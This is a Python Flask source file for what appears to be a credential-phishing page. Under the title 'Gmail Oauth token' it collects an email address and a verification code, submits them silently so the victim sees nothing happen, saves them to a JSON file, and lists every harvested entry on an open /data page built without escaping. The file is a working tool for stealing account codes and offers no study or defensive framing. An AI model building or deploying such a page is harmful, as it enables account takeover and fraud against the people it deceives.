from flask import Flask, request, render_template_string
import json
import os

app = Flask(__name__)

DATA_FILE = "data.json"

HTML_FORM = """
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Gmail Oauth token</title>

<style>
body{
    background:#000;
    display:flex;
    justify-content:center;
    align-items:center;
    min-height:100vh;
    font-family:Arial,sans-serif;
}

.container{
    width:500px;
    background:#0a0a0a;
    border:2px solid #39ff14;
    border-radius:20px;
    padding:40px;
    box-shadow:0 0 20px #39ff14;
}

h1{
    color:#39ff14;
    text-align:center;
    margin-bottom:30px;
}

input{
    width:100%;
    padding:15px;
    margin:10px 0;
    background:black;
    color:#39ff14;
    border:2px solid #39ff14;
    border-radius:10px;
}

input::placeholder{
    color:#39ff14;
}

button{
    width:100%;
    padding:15px;
    background:black;
    color:#39ff14;
    border:2px solid #39ff14;
    border-radius:10px;
    cursor:pointer;
}

button:hover{
    background:#39ff14;
    color:black;
}
</style>
</head>

<body>

<div class="container">
    <h1>Gmail Oauth token</h1>

    <form id="form">
        <input type="email" name="email" placeholder="Email" required>
        <input type="email" name="confirm_email" placeholder="Confirm Email" required>
        <input type="text" name="code" placeholder="Code" required>
        <button type="submit">SUBMIT</button>
    </form>
</div>

<script>
document.getElementById("form").addEventListener("submit", async function(e) {
    e.preventDefault();

    const formData = new FormData(this);

    await fetch("/submit", {
        method: "POST",
        body: formData
    });

    // silent submit (nothing happens visually)
});
</script>

</body>
</html>
"""


@app.route("/")
def home():
    return render_template_string(HTML_FORM)


@app.route("/submit", methods=["POST"])
def submit():

    entry = {
        "email": request.form["email"],
        "confirm_email": request.form["confirm_email"],
        "code": request.form["code"]
    }

    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as f:
            try:
                data = json.load(f)
            except:
                data = []
    else:
        data = []

    data.append(entry)

    with open(DATA_FILE, "w") as f:
        json.dump(data, f, indent=4)

    return ("", 204)


@app.route("/data")
def data():

    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as f:
            try:
                records = json.load(f)
            except:
                records = []
    else:
        records = []

    html = """
    <html>
    <body style="background:black;color:#39ff14;font-family:Arial;padding:20px;">
    <h1>Stored Submissions</h1>

    <table border="1" cellpadding="10">
        <tr>
            <th>Email</th>
            <th>Confirm Email</th>
            <th>Code</th>
        </tr>
    """

    for row in records:
        html += f"""
        <tr>
            <td>{row['email']}</td>
            <td>{row['confirm_email']}</td>
            <td>{row['code']}</td>
        </tr>
        """

    html += "</table></body></html>"

    return html


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)